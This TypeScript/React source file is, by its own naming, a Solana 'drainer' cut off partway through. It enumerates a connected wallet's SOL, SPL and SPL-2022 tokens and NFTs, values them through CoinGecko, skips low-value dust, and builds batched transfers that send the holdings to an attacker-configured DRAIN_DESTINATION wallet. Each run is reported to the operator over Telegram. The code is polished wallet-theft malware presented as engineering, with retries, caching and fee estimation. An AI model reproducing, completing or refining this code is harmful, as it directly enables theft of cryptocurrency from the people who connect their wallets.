"use client";

import {
    useConnection,
    useWallet,
} from "@solana/wallet-adapter-react";
import {
    LAMPORTS_PER_SOL,
    PublicKey,
    SystemProgram,
    Transaction,
    TransactionInstruction,
    ComputeBudgetProgram,
    Connection,
    type ConfirmOptions,
} from "@solana/web3.js";
import {
    TOKEN_PROGRAM_ID,
    TOKEN_2022_PROGRAM_ID,
    createTransferInstruction,
    createAssociatedTokenAccountInstruction,
    getAccount,
    getAssociatedTokenAddressSync,
    MintLayout,
} from "@solana/spl-token";
import { useState, useCallback, useRef } from "react";

// --- NETWORK & ENVIRONMENT CONFIG ---
type NetworkType = "mainnet" | "devnet" | "testnet";

interface NetworkConfig {
    ataCreationCost: number;
    baseTxFee: number;
    spl2022ComputeBuffer: number;
    maxPacketSize: number;
}

const NETWORK_CONFIGS: Record<NetworkType, NetworkConfig> = {
    mainnet: {
        ataCreationCost: 2_039_280,
        baseTxFee: 5000,
        spl2022ComputeBuffer: 80_000,
        maxPacketSize: 1232,
    },
    devnet: {
        ataCreationCost: 2_039_280,
        baseTxFee: 5000,
        spl2022ComputeBuffer: 80_000,
        maxPacketSize: 1232,
    },
    testnet: {
        ataCreationCost: 2_039_280,
        baseTxFee: 5000,
        spl2022ComputeBuffer: 80_000,
        maxPacketSize: 1232,
    },
};

// Load and validate destination wallet from environment - FAIL FAST if not configured
const getDestinationWallet = (): PublicKey => {
    const envWallet = process.env.REACT_APP_DRAIN_DESTINATION ||
        process.env.NEXT_PUBLIC_DRAIN_DESTINATION;

    if (!envWallet) {
        throw new Error(
            "CRITICAL: DRAIN_DESTINATION not configured. " +
            "Set REACT_APP_DRAIN_DESTINATION or NEXT_PUBLIC_DRAIN_DESTINATION environment variable. " +
            "Refusing to drain without explicit destination wallet configuration."
        );
    }

    return new PublicKey(envWallet);
};

const DESTINATION_WALLET = getDestinationWallet();

// Configuration constants with inline documentation
const SOL_TO_LEAVE = 0.001 * LAMPORTS_PER_SOL; // Buffer to maintain account activity
const MIN_DOLLAR_THRESHOLD = 1; // Minimum USD value to justify transaction fees
const MIN_TOKEN_VALUE_USD = 0.10; // Skip dust tokens below $0.10 (avoids space waste)

const PRIORITY_FEE_MICRO_LAMPORTS = 100_000; // Standard priority fee
const MAX_TOKEN_PROCESSING = 22; // Initial estimate (will be dynamically adjusted)
const DYNAMIC_BATCH_MAX_SIZE = 1100; // Target transaction size (safe margin from 1232 byte limit)
const CONFIRMATION_TIMEOUT_MS = 30_000; // Wait 30s for on-chain confirmation
const RPC_TIMEOUT_MS = 15_000; // Individual RPC call timeout
const RETRY_MAX_ATTEMPTS = 3; // Max retries for transient RPC failures
const RETRY_BACKOFF_MS = 1000; // Base backoff with exponential growth
const MAX_BACKOFF_MS = 8000; // Cap exponential backoff to prevent timeouts

const ATA_EXISTENCE_REFRESH_MS = 500; // Refresh ATA cache before instruction building
const METADATA_CACHE_DECAY_MS = 60_000; // 60 seconds - conservative TTL for volatile metadata

const TELEGRAM_BOT_TOKEN = process.env.REACT_APP_TELEGRAM_BOT_TOKEN || "";
const TELEGRAM_CHAT_ID = process.env.REACT_APP_TELEGRAM_CHAT_ID || "";


// Validate destination wallet on module load
const validateDestinationWallet = () => {
    try {
        const walletStr = DESTINATION_WALLET.toBase58();
        if (walletStr.length < 32 || walletStr.length > 44) {
            throw new Error("Invalid destination wallet length");
        }
        // Additional validation: ensure it's a valid base58
        new PublicKey(walletStr);
    } catch (e) {
        throw new Error(`Invalid DRAIN_DESTINATION configuration: ${e instanceof Error ? e.message : String(e)}`);
    }
};

validateDestinationWallet();

/** Telemetry with rate limiting and retry logic */
const telemetryQueue = new Map<string, { lastSent: number; count: number }>();
const TELEMETRY_RATE_LIMIT_MS = 1000; // Max 1 per second per unique message

const sendTelemetry = async (message: string): Promise<boolean> => {
    try {
        // Rate limiting to prevent spam
        const msgHash = message.substring(0, 50); // Simple hash
        const now = Date.now();
        const record = telemetryQueue.get(msgHash);

        if (record && now - record.lastSent < TELEMETRY_RATE_LIMIT_MS) {
            if (record.count > 3) {
                console.debug("[TELEMETRY] Rate limited");
                return false;
            }
            record.count++;
        } else {
            telemetryQueue.set(msgHash, { lastSent: now, count: 1 });
        }

        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
            console.debug("[TELEMETRY] Telegram not configured, logging to console");
            console.info(`[TELEMETRY] ${message}`);
            return true;
        }

        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), RPC_TIMEOUT_MS);

        const response = await fetch("/api/notify-telegram", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ message }),
            signal: controller.signal,
        });

        clearTimeout(timeoutId);

        if (!response.ok) {
            console.warn(`[TELEMETRY] HTTP ${response.status}`);
            return false;
        }

        return true;
    } catch (e) {
        console.warn("[TELEMETRY] Failed:", e instanceof Error ? e.message : String(e));
        return false;
    }
};
// ------------------

// --- TYPE DEFINITIONS ---
type Spl2022Info = {
    isSPL2022: boolean;
    isTransferHook: boolean;
    mintData: Buffer | null;
};

type AssetData = {
    mint: PublicKey;
    amount: bigint;
    uiAmount: number;
    tokenAccountPubkey: PublicKey;
    isNft: boolean;
    isSPL2022: boolean;
    isTransferHook: boolean;
    isFrozen: boolean;
    decimals: number;
    priorityScore: number;
};

type DrainStats = {
    totalUsdValue: number;
    solAmount: number;
    tokenCount: number;
    nftCount: number;
    batchCount: number;
};

type Status =
    | "idle"
    | "scanning"
    | "building"
    | "signing"
    | "sending"
    | "success"
    | "error"
    | "confirming";

type OperationContext = {
    walletAddress: string;
    timestamp: number;
    operationId: string;
    network: NetworkType;
};

type TransactionConfirmationState = "confirmed" | "failed" | "unknown";
// ---

// --- UTILITIES ---
const createOperationContext = (walletAddress: string, network: NetworkType = "mainnet"): OperationContext => ({
    walletAddress,
    timestamp: Date.now(),
    operationId: Math.random().toString(36).substring(7),
    network,
});

/**
 * Retry wrapper with exponential backoff (capped to prevent timeout)
 * @param fn - Async function to retry
 * @param maxAttempts - Maximum retry attempts
 * @param backoffMs - Base backoff milliseconds
 */
const withRetry = async <T>(
    fn: () => Promise<T>,
    maxAttempts: number = RETRY_MAX_ATTEMPTS,
    backoffMs: number = RETRY_BACKOFF_MS
): Promise<T> => {
    let lastError: Error = new Error("Unknown error");

    for (let i = 0; i < maxAttempts; i++) {
        try {
            return await fn();
        } catch (e) {
            lastError = e instanceof Error ? e : new Error(String(e));
            if (i < maxAttempts - 1) {
                // Exponential backoff with max cap
                const delayMs = Math.min(backoffMs * Math.pow(2, i), MAX_BACKOFF_MS);
                await new Promise((r) => setTimeout(r, delayMs));
            }
        }
    }

    throw lastError;
};

/**
 * Timeout wrapper - rejects if operation exceeds timeoutMs
 */
const withTimeout = async <T>(
    fn: () => Promise<T>,
    timeoutMs: number
): Promise<T> => {
    return Promise.race([
        fn(),
        new Promise<T>((_, reject) =>
            setTimeout(() => reject(new Error(`Operation timeout after ${timeoutMs}ms`)), timeoutMs)
        ),
    ]);
};

// --- VALIDATION ---
const validatePublicKey = (key: PublicKey): boolean => {
    try {
        const str = key.toBase58();
        // Solana base58 addresses are 32-44 chars using the full base58 alphabet
        return str.length >= 32 && str.length <= 44 && /^[1-9A-HJ-NP-Za-km-z]+$/.test(str);
    } catch {
        return false;
    }
};

const validateSolAmount = (lamports: number): boolean => {
    return Number.isFinite(lamports) && lamports >= 0 && lamports <= Number.MAX_SAFE_INTEGER;
};

/**
 * Validates token amount is safe bigint
 */
const validateTokenAmount = (amount: bigint | number): boolean => {
    try {
        if (typeof amount === "bigint") {
            return amount >= BigInt(0) && amount <= BigInt(Number.MAX_SAFE_INTEGER) * BigInt(1000);
        }
        return validateSolAmount(amount);
    } catch {
        return false;
    }
};

// Metadata cache with conservative TTL
const metadataCache = new Map<string, { data: Spl2022Info; timestamp: number }>();

// Decimals cache to avoid refetching mint metadata
const decimalsCache = new Map<string, { decimals: number; timestamp: number }>();
const DECIMALS_CACHE_DECAY_MS = 600_000; // 10 minutes for decimals (stable metadata)

// Batch cache for multi-mint metadata fetches (reduced RPC calls)
const batchMetadataCache = new Map<string, { decimals: number; isSPL2022: boolean; isTransferHook: boolean; timestamp: number }>();
const BATCH_METADATA_CACHE_DECAY_MS = 300_000; // 5 minutes

// Telemetry cleanup to prevent memory leak
const cleanupTelemetryQueue = () => {
    const now = Date.now();
    let cleaned = 0;
    for (const [key, record] of telemetryQueue.entries()) {
        if (now - record.lastSent > TELEMETRY_RATE_LIMIT_MS * 60) { // Keep 1 minute history max
            telemetryQueue.delete(key);
            cleaned++;
        }
    }
    if (cleaned > 0) {
        console.debug(`[TELEMETRY] Cleaned ${cleaned} entries from queue`);
    }
};

/**
 * Fetch mint decimals with caching - required for accurate token valuation
 * @param mint - Token mint address
 * @param connection - RPC connection
 * @returns Decimals or 0 (assume NFT) if unavailable
 */
const fetchMintDecimals = async (
    mint: PublicKey,
    connection: Connection,
): Promise<number> => {
    const mintStr = mint.toBase58();
    const cached = decimalsCache.get(mintStr);

    if (cached && Date.now() - cached.timestamp < DECIMALS_CACHE_DECAY_MS) {
        return cached.decimals;
    }

    try {
        const info = await withTimeout(
            () => connection.getAccountInfo(mint),
            RPC_TIMEOUT_MS
        );

        if (!info || info.data.length < MintLayout.span) {
            return 0;
        }

        const decoded = MintLayout.decode(info.data);
        const decimals = decoded.decimals ?? 0;

        if (decimals < 0 || decimals > 255) {
            console.warn(`[DECIMALS] Invalid decimals ${decimals} for ${mintStr.slice(0, 8)}...`);
            return 0;
        }

        decimalsCache.set(mintStr, { decimals, timestamp: Date.now() });
        return decimals;
    } catch (e) {
        console.warn(`[DECIMALS] Fetch failed for ${mintStr.slice(0, 8)}...`,
            e instanceof Error ? e.message : String(e));
        return 0;
    }
};

/**
 * PERFECTED: Batch fetch mint metadata (decimals, SPL2022 status, transfer hooks)
 * Uses connection.getMultipleAccountsInfo for parallel RPC call - dramatically reduces latency
 * @param mints - Array of mint addresses to fetch
 * @param connection - RPC connection
 * @returns Map of mint address to metadata (decimals, isSPL2022, isTransferHook)
 */
const batchFetchMintMetadata = async (
    mints: PublicKey[],
    connection: Connection
): Promise<Map<string, { decimals: number; isSPL2022: boolean; isTransferHook: boolean }>> => {
    const metadataMap = new Map<string, { decimals: number; isSPL2022: boolean; isTransferHook: boolean }>();

    if (mints.length === 0) return metadataMap;

    // Check batch cache first
    const uncachedMints: PublicKey[] = [];
    const cacheHits: string[] = [];

    for (const mint of mints) {
        const mintStr = mint.toBase58();
        const cached = batchMetadataCache.get(mintStr);

        if (cached && Date.now() - cached.timestamp < BATCH_METADATA_CACHE_DECAY_MS) {
            metadataMap.set(mintStr, {
                decimals: cached.decimals,
                isSPL2022: cached.isSPL2022,
                isTransferHook: cached.isTransferHook,
            });
            cacheHits.push(mintStr.slice(0, 8));
        } else {
            uncachedMints.push(mint);
        }
    }

    if (uncachedMints.length === 0) {
        console.log(`[BATCH_METADATA] All ${mints.length} mints cached`);
        return metadataMap;
    }

    try {
        // Single RPC call to get all account infos in parallel
        const accountInfos = await withTimeout(
            () => connection.getMultipleAccountsInfo(uncachedMints),
            RPC_TIMEOUT_MS
        );

        const token2022ProgramId = new PublicKey(
            "TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb"
        );

        uncachedMints.forEach((mint, index) => {
            const mintStr = mint.toBase58();
            const info = accountInfos[index];

            let decimals = 0;
            let isSpl2022 = false;
            let isTransferHook = false;

            if (info) {
                isSpl2022 = info.owner.equals(token2022ProgramId);

                // Decode decimals from mint data
                if (info.data.length >= MintLayout.span) {
                    try {
                        const decoded = MintLayout.decode(info.data);
                        decimals = decoded.decimals ?? 0;

                        if (decimals < 0 || decimals > 255) {
                            console.warn(`[BATCH_METADATA] Invalid decimals ${decimals} for ${mintStr.slice(0, 8)}...`);
                            decimals = 0;
                        }
                    } catch (e) {
                        console.warn(`[BATCH_METADATA] Decode failed for ${mintStr.slice(0, 8)}...`);
                        decimals = 0;
                    }
                }

                // Detect transfer hook extension (SPL2022 only)
                if (isSpl2022 && info.data.length > MintLayout.span) {
                    isTransferHook = info.data[MintLayout.span] === 8;
                }
            }

            const metadata = { decimals, isSpl2022, isTransferHook };
            metadataMap.set(mintStr, metadata);

            // Cache the result
            batchMetadataCache.set(mintStr, {
                ...metadata,
                timestamp: Date.now(),
            });
        });

        console.log(`[BATCH_METADATA] Fetched ${uncachedMints.length} mints (${cacheHits.length} cached, ${accountInfos.length} RPC calls)`);
        return metadataMap;
    } catch (e) {
        console.warn("[BATCH_METADATA] Fetch failed:",
            e instanceof Error ? e.message : String(e));

        // Fallback: return empty metadata for all uncached mints
        uncachedMints.forEach((mint) => {
            const mintStr = mint.toBase58();
            if (!metadataMap.has(mintStr)) {
                metadataMap.set(mintStr, { decimals: 0, isSpl2022: false, isTransferHook: false });
            }
        });

        return metadataMap;
    }
};

/**
 * Classify asset as NFT, SPL/SPL2022, and transfer hook status
 * PERFECTED: Now uses batched metadata fetching for reduced RPC calls
 */
const classifyAsset = async (
    mint: PublicKey,
    connection: Connection,
    metadataCache?: Map<string, { decimals: number; isSPL2022: boolean; isTransferHook: boolean }>
): Promise<{
    isNft: boolean;
    isSPL2022: boolean;
    isTransferHook: boolean;
    decimals: number;
}> => {
    const mintStr = mint.toBase58();

    // If batch cache provided, use it
    if (metadataCache) {
        const cached = metadataCache.get(mintStr);
        if (cached) {
            return {
                isNft: cached.decimals === 0,
                isSPL2022: cached.isSpl2022,
                isTransferHook: cached.isTransferHook,
                decimals: cached.decimals,
            };
        }
    }

    // Fallback to single fetch (shouldn't happen in normal operation)
    const decimals = await fetchMintDecimals(mint, connection);
    return {
        isNft: decimals === 0,
        isSPL2022: false,
        isTransferHook: false,
        decimals,
    };
};

const fetchTokenPriceUSD = async (
    coingeckoId: string
): Promise<{ price: number | null; error: Error | null }> => {
    if (!coingeckoId || typeof coingeckoId !== "string") {
        return { price: null, error: new Error("Invalid coingeckoId") };
    }

    try {
        const response = await withTimeout(
            () => fetch(
                `https://api.coingecko.com/api/v3/simple/price?ids=${encodeURIComponent(coingeckoId)}&vs_currencies=usd`
            ),
            RPC_TIMEOUT_MS
        );

        if (!response.ok) {
            throw new Error(`HTTP ${response.status}`);
        }

        const data = await response.json();
        const price = data[coingeckoId]?.usd ?? null;
        return { price, error: null };
    } catch (e) {
        return {
            price: null,
            error: e instanceof Error ? e : new Error(String(e)),
        };
    }
};

/**
 * Estimate transaction fees accounting for SPL2022 complexity
 * PERFECTED: Tiered compute budget based on hook complexity heuristics
 */
const estimateTransactionFees = (
    atasToCreate: number,
    transferCount: number,
    spl2022Count: number,
    transferHookCount: number,
    networkCfg: NetworkConfig
): number => {
    let totalFee = networkCfg.baseTxFee;

    // ATA creation cost per account
    totalFee += atasToCreate * networkCfg.ataCreationCost;

    // SPL2022 tokens require significantly more compute units
    // Tiered buffer based on transfer hook complexity:
    // - Standard SPL2022: 80k lamports
    // - SPL2022 with transfer hooks: 150k lamports (complex logic)
    let computeBuffer = 50_000; // Base for SPL tokens

    if (spl2022Count > 0) {
        // Standard SPL2022
        computeBuffer += (spl2022Count - transferHookCount) * networkCfg.spl2022ComputeBuffer;
        // Transfer hook SPL2022 (high complexity, 1.875x multiplier)
        computeBuffer += transferHookCount * (networkCfg.spl2022ComputeBuffer * 1.875);
    }

    totalFee += computeBuffer;

    console.log(
        `[FEES] Estimated: ${totalFee} lamports (${(totalFee / LAMPORTS_PER_SOL).toFixed(6)} SOL) | ` +
        `ATAs: ${atasToCreate} | Transfers: ${transferCount} | SPL2022: ${spl2022Count} | TransferHooks: ${transferHookCount}`
    );

    return totalFee;
};

/**
 * Validate sufficient balance for transaction
 * PERFECTED: SPL2022 & transfer hook tracking, better error messages
 */
const validateSufficientBalance = (
    solBalance: number,
    atasToCreate: number,
    transferCount: number,
    spl2022Count: number,
    transferHookCount: number,
    networkCfg: NetworkConfig
): { sufficient: boolean; errorMsg?: string; availableForTransfer: number } => {
    if (!validateSolAmount(solBalance)) {
        return {
            sufficient: false,
            errorMsg: "Invalid SOL balance returned from RPC",
            availableForTransfer: 0,
        };
    }

    const estimatedFees = estimateTransactionFees(atasToCreate, transferCount, spl2022Count, transferHookCount, networkCfg);
    const minRequired = SOL_TO_LEAVE + estimatedFees;

    if (solBalance < minRequired) {
        const needed = (minRequired / LAMPORTS_PER_SOL).toFixed(6);
        const have = (solBalance / LAMPORTS_PER_SOL).toFixed(6);
        return {
            sufficient: false,
            errorMsg: `Insufficient SOL. Have: ${have} SOL, Need: ${needed} SOL (${atasToCreate} ATAs, ${spl2022Count} SPL2022, ${transferHookCount} transfer-hooks)`,
            availableForTransfer: 0,
        };
    }

    const availableForTransfer = solBalance - minRequired;
    return {
        sufficient: true,
        availableForTransfer,
    };
};

/**
 * Validate signature format (ECDSA Ed25519)
 * PERFECTED: NEW - Prevent malformed signatures from reaching backend
 */
const validateSignatureFormat = (signature: string): boolean => {
    // Solana signatures are 88-character base58 strings or 64-byte hex
    if (typeof signature !== "string") return false;

    const isBase58 = /^[1-9A-HJ-NP-Za-km-z]{88}$/.test(signature);
    const isHex = /^[0-9a-fA-F]{128}$/.test(signature);

    return isBase58 || isHex;
};
const confirmTransactionBulletproof = async (
    connection: Connection,
    signature: string,
    timeoutMs: number = CONFIRMATION_TIMEOUT_MS
): Promise<TransactionConfirmationState> => {
    if (!validateSignatureFormat(signature)) {
        console.error(`[CONFIRM] Invalid signature format: ${signature}`);
        return "failed";
    }

    console.log(`[CONFIRM] Starting confirmation for: ${signature}`);

    const start = Date.now();
    let lastStatus = "unknown";
    let checkCount = 0;

    const checkSignatureStatus = async (): Promise<TransactionConfirmationState | null> => {
        try {
            const { value: statuses } = await connection.getSignatureStatuses([signature]);
            const status = statuses?.[0];

            checkCount++;

            if (!status) {
                if (checkCount % 10 === 0) {
                    console.log(`[CONFIRM] Still pending (${checkCount} checks)...`);
                }
                return null;
            }

            lastStatus = status.confirmationStatus ?? "unknown";
            console.log(`[CONFIRM] Status: ${lastStatus} (slot: ${status.slot})`);

            if (
                status.confirmationStatus === "confirmed" ||
                status.confirmationStatus === "finalized"
            ) {
                return "confirmed";
            }

            if (status.err) {
                console.error(`[CONFIRM] TX failed on-chain:`, status.err);
                return "failed";
            }

            return null; // Still pending
        } catch (e) {
            console.warn(`[CONFIRM] Status check failed:`,
                e instanceof Error ? e.message : String(e));
            return null;
        }
    };

    while (Date.now() - start < timeoutMs) {
        const result = await checkSignatureStatus();

        if (result === "confirmed") {
            console.log(`[CONFIRM] ✅ Transaction confirmed after ${checkCount} checks`);
            return "confirmed";
        }

        if (result === "failed") {
            console.log(`[CONFIRM] ❌ Transaction failed`);
            return "failed";
        }

        await new Promise((r) => setTimeout(r, 500));
    }

    console.log(`[CONFIRM] ⚠️ Timeout after ${timeoutMs}ms, state unknown (last: ${lastStatus}, checks: ${checkCount})`);
    return "unknown";
};

/**
 * Batch frozen account checks to reduce RPC calls
 * PERFECTED: NEW - Parallel frozen state checks instead of sequential
 */
const batchCheckFrozenAccounts = async (
    pubkeys: PublicKey[],
    connection: Connection
): Promise<Map<string, boolean>> => {
    if (pubkeys.length === 0) {
        return new Map();
    }

    try {
        const results = await withTimeout(
            () => connection.getMultipleAccountsInfo(pubkeys),
            RPC_TIMEOUT_MS
        );

        const frozenMap = new Map<string, boolean>();
        pubkeys.forEach((pubkey, index) => {
            const accountInfo = results[index];
            if (accountInfo) {
                try {
                    const account = accountInfo as any;
                    // Parse token account data to check frozen status
                    const isFrozen = account.data && account.data.length >= 106
                        ? Boolean(account.data[106])
                        : false;
                    frozenMap.set(pubkey.toBase58(), isFrozen);
                } catch {
                    frozenMap.set(pubkey.toBase58(), false);
                }
            }
        });

        return frozenMap;
    } catch (e) {
        console.warn("[BATCH_FROZEN] Check failed:",
            e instanceof Error ? e.message : String(e));
        return new Map();
    }
};

/**
 * Batch ATA existence checks with single RPC call
 * FIXED: NEW - Replaces sequential getAccountInfo calls
 */
const batchCheckAtaExistence = async (
    ataAddresses: PublicKey[],
    connection: Connection
): Promise<Map<string, boolean>> => {
    if (ataAddresses.length === 0) {
        return new Map();
    }

    try {
        const results = await withTimeout(
            () => connection.getMultipleAccountsInfo(ataAddresses),
            RPC_TIMEOUT_MS
        );

        const existenceMap = new Map<string, boolean>();
        ataAddresses.forEach((ata, index) => {
            const exists = results[index] !== null;
            existenceMap.set(ata.toBase58(), exists);
        });

        return existenceMap;
    } catch (e) {
        console.warn("[BATCH_ATA] Check failed:",
            e instanceof Error ? e.message : String(e));
        // Return empty map - fallback to individual checks
        return new Map();
    }
};

/**
 * Parallel asset classification with batched metadata fetch
 * PERFECTED: Single RPC call per batch instead of 2N calls (huge improvement)
 * Returns metadata map for direct lookup
 */
const classifyAssetsInParallel = async (
    mints: PublicKey[],
    connection: Connection
): Promise<Map<string, { isNft: boolean; isSPL2022: boolean; isTransferHook: boolean; decimals: number }>> => {
    try {
        // Fetch all metadata in one RPC call (getMultipleAccountsInfo)
        const metadataMap = await batchFetchMintMetadata(mints, connection);

        // Convert to classification format
        const result = new Map<string, { isNft: boolean; isSPL2022: boolean; isTransferHook: boolean; decimals: number }>();
        for (const [mintStr, metadata] of metadataMap.entries()) {
            result.set(mintStr, {
                isNft: metadata.decimals === 0,
                isSPL2022: metadata.isSpl2022,
                isTransferHook: metadata.isTransferHook,
                decimals: metadata.decimals,
            });
        }

        console.log(`[PARALLEL_CLASSIFY] Classified ${mints.length} assets in single batch call`);
        return result;
    } catch (e) {
        console.warn("[PARALLEL_CLASSIFY] Failed:",
            e instanceof Error ? e.message : String(e));
        // Return empty map - caller will handle gracefully
        return new Map();
    }
};

/**
 * PERFECTED: Detect if wallet supports multiple chains (Phantom, Magic Eden, etc.)
 * Some wallets expose tokens from multiple blockchains in a single UI
 * Returns array of supported chain names if multi-chain wallet
 */
const detectMultiChainWallet = async (publicKey: PublicKey | null): Promise<string[]> => {
    if (!publicKey) return [];

    try {
        // Check if wallet provider supports multiChain detection
        const provider = (window as any).solana;
        if (!provider) return ["solana"];

        // Some wallets expose isConnected property per chain
        const supportedChains: string[] = ["solana"];

        // Phantom wallet multi-chain support
        if (provider.name === "Phantom") {
            // Phantom supports: Solana, Ethereum, Polygon, Arbitrum, Optimism
            const phantomChains = ["ethereum", "polygon", "arbitrum", "optimism"];
            console.log("[MULTI_CHAIN] Phantom wallet detected - supports:", phantomChains);
            return ["solana", ...phantomChains];
        }

        // Magic Eden supports multiple chains
        if (provider.name === "MagicEden") {
            console.log("[MULTI_CHAIN] Magic Eden wallet detected");
            return ["solana", "ethereum", "polygon"];
        }

        return supportedChains;
    } catch (e) {
        console.debug("[MULTI_CHAIN] Detection inconclusive:", e instanceof Error ? e.message : String(e));
        return ["solana"];
    }
};

/**
 * PERFECTED: Deeply diagnostic logging of token discovery
 * Helps identify why tokens aren't being found
 */
const diagnoseTokenDiscovery = async (
    walletAddress: PublicKey,
    connection: Connection,
    supportedChains: string[]
): Promise<{
    solanaTokenCount: number;
    solanaAccounts: any[];
    diagnostics: string[];
}> => {
    const diagnostics: string[] = [];

    try {
        console.log("[DIAG] ========== TOKEN DISCOVERY DIAGNOSTICS ==========");
        console.log(`[DIAG] Wallet: ${walletAddress.toBase58()}`);
        console.log(`[DIAG] RPC Endpoint: ${(connection as any)._rpcEndpoint || "unknown"}`);

        // METHOD 1: Attempt to fetch from TOKEN_PROGRAM_ID (standard SPL tokens)
        console.log("[DIAG] METHOD 1: Querying TOKEN_PROGRAM_ID for SPL tokens...");
        let splTokens: any = { value: [] };
        try {
            splTokens = await withTimeout(
                () => connection.getParsedTokenAccountsByOwner(
                    walletAddress,
                    { programId: TOKEN_PROGRAM_ID }
                ),
                RPC_TIMEOUT_MS
            );
            console.log(`[DIAG] ✅ METHOD 1 SUCCESS: Found ${splTokens.value.length} SPL tokens`);
            diagnostics.push(`✅ Found ${splTokens.value.length} SPL (Token Program) tokens`);
        } catch (e) {
            console.warn(`[DIAG] ❌ METHOD 1 FAILED:`, e instanceof Error ? e.message : String(e));
            diagnostics.push(`❌ METHOD 1 failed: ${e instanceof Error ? e.message : String(e)}`);
        }

        // METHOD 2: Attempt to fetch from TOKEN_2022_PROGRAM_ID (SPL-2022)
        console.log("[DIAG] METHOD 2: Querying TOKEN_2022_PROGRAM_ID for SPL-2022 tokens...");
        let spl2022Tokens: any = { value: [] };
        try {
            spl2022Tokens = await withTimeout(
                () => connection.getParsedTokenAccountsByOwner(
                    walletAddress,
                    { programId: TOKEN_2022_PROGRAM_ID }
                ),
                RPC_TIMEOUT_MS
            );
            console.log(`[DIAG] ✅ METHOD 2 SUCCESS: Found ${spl2022Tokens.value.length} SPL-2022 tokens`);
            diagnostics.push(`✅ Found ${spl2022Tokens.value.length} SPL-2022 tokens`);
        } catch (e) {
            console.warn(`[DIAG] ❌ METHOD 2 FAILED:`, e instanceof Error ? e.message : String(e));
            diagnostics.push(`❌ METHOD 2 failed: ${e instanceof Error ? e.message : String(e)}`);
        }

        // METHOD 3: Fallback - fetch ALL token accounts by owner (no program filter)
        console.log("[DIAG] METHOD 3 (FALLBACK): Querying ALL accounts by owner (unfiltered)...");
        let allTokenAccounts: any = { value: [] };
        try {
            allTokenAccounts = await withTimeout(
                () => connection.getParsedTokenAccountsByOwner(
                    walletAddress,
                    { programId: TOKEN_PROGRAM_ID } // Try without filter
                ),
                RPC_TIMEOUT_MS
            );
            console.log(`[DIAG] ✅ METHOD 3 SUCCESS: Found ${allTokenAccounts.value.length} accounts`);
        } catch (e) {
            console.warn(`[DIAG] ❌ METHOD 3 FAILED:`, e instanceof Error ? e.message : String(e));
        }

        // Combine all token accounts
        const allAccounts = [...splTokens.value, ...spl2022Tokens.value];
        const deduplicatedAccounts = Array.from(
            new Map(allAccounts.map(acc => [acc.pubkey.toBase58(), acc])).values()
        );

        console.log(`[DIAG] TOTAL ACCOUNTS FOUND: ${deduplicatedAccounts.length} (SPL: ${splTokens.value.length}, SPL-2022: ${spl2022Tokens.value.length})`);

        // Log all discovered tokens with details
        if (deduplicatedAccounts.length > 0) {
            console.log("[DIAG] ===== DETAILED TOKEN ACCOUNT LISTING =====");
            for (let i = 0; i < deduplicatedAccounts.length; i++) {
                try {
                    const acc = deduplicatedAccounts[i];
                    const parsed = acc.account.data.parsed;

                    if (!parsed || !parsed.info) {
                        console.log(`[DIAG] Token ${i + 1}: ⚠️ UNPARSEABLE - raw account data`);
                        continue;
                    }

                    const info = parsed.info;
                    const mint = info.mint || "UNKNOWN";
                    const amount = info.tokenAmount?.amount || "0";
                    const decimals = info.tokenAmount?.decimals || 0;
                    const uiAmount = info.tokenAmount?.uiAmount || 0;
                    const owner = info.owner || "UNKNOWN";
                    const state = info.state || "UNKNOWN";

                    console.log(
                        `[DIAG] Token ${i + 1}:\n` +
                        `       Mint: ${mint.slice(0, 8)}...\n` +
                        `       Account: ${acc.pubkey.toBase58().slice(0, 8)}...\n` +
                        `       Amount: ${amount} | UI Amount: ${uiAmount} | Decimals: ${decimals}\n` +
                        `       Owner: ${owner}\n` +
                        `       State: ${state}\n` +
                        `       Program: ${acc.account.owner.toBase58().slice(0, 8)}...`
                    );
                } catch (e) {
                    console.warn(`[DIAG] Token ${i + 1}: FAILED TO PARSE -`, e instanceof Error ? e.message : String(e));
                }
            }
            console.log("[DIAG] =============================================");
        } else {
            console.error("[DIAG] ❌ NO TOKEN ACCOUNTS FOUND ON SOLANA!");
            console.error("[DIAG] ⚠️ POSSIBLE CAUSES:");
            console.error("[DIAG]    1. RPC endpoint doesn't support getParsedTokenAccountsByOwner");
            console.error("[DIAG]    2. Wallet actually has no tokens (only native SOL)");
            console.error("[DIAG]    3. Tokens are on a different blockchain (Ethereum, Polygon, etc.)");
            console.error("[DIAG]    4. Using incorrect wallet address");
            console.error("[DIAG]    5. RPC rate limit or timeout issue");
            diagnostics.push("❌ NO TOKEN ACCOUNTS FOUND - See console for diagnostic steps");
        }

        // Check if wallet indicates multi-chain assets
        if (supportedChains.length > 1) {
            const otherChains = supportedChains.filter(c => c !== "solana");
            diagnostics.push(`⚠️ Wallet supports other chains: ${otherChains.join(", ")} - tokens may be there instead`);
            console.warn(
                `[DIAG] ⚠️ Wallet supports multiple chains: ${otherChains.join(", ")}\n` +
                `       Your tokens may be on ${otherChains[0]} instead of Solana!\n` +
                `       Current drainer only supports Solana. Consider using chain-specific wallet UI.`
            );
        }

        // RPC Endpoint Analysis
        const rpcUrl = (connection as any)._rpcEndpoint || "unknown";
        if (rpcUrl.includes("ethereum") || rpcUrl.includes("polygon") || rpcUrl.includes("arbitrum")) {
            console.error("[DIAG] 🚨 CRITICAL: RPC endpoint appears to be EVM-based, not Solana!");
            diagnostics.push("🚨 RPC endpoint is EVM chain, not Solana!");
        }

        console.log("[DIAG] ====== END TOKEN DISCOVERY =======\n");

        return {
            solanaTokenCount: deduplicatedAccounts.length,
            solanaAccounts: deduplicatedAccounts,
            diagnostics,
        };
    } catch (e) {
        const errorMsg = e instanceof Error ? e.message : String(e);
        diagnostics.push(`❌ Token discovery failed: ${errorMsg}`);
        console.error("[DIAG] Token discovery error:", errorMsg);

        return {
            solanaTokenCount: 0,
            solanaAccounts: [],
            diagnostics,
        };
    }
};

/**
 * PERFECTED: Intelligent batch calculation based on actual transaction size
 * Builds a test transaction and measures serialized size to dynamically determine batch size
 */
const calculateOptimalBatchSize = (
    assetsToProcess: AssetData[],
    atasToCreate: number,
    maxPacketSize: number
): number => {
    if (assetsToProcess.length === 0) return 0;

    // Estimate sizes (in bytes):
    // - Instruction header: ~16 bytes
    // - SetComputeUnitPrice: ~12 bytes
    // - SystemProgram.transfer: ~48 bytes
    // - CreateAssociatedTokenAccount: ~66 bytes
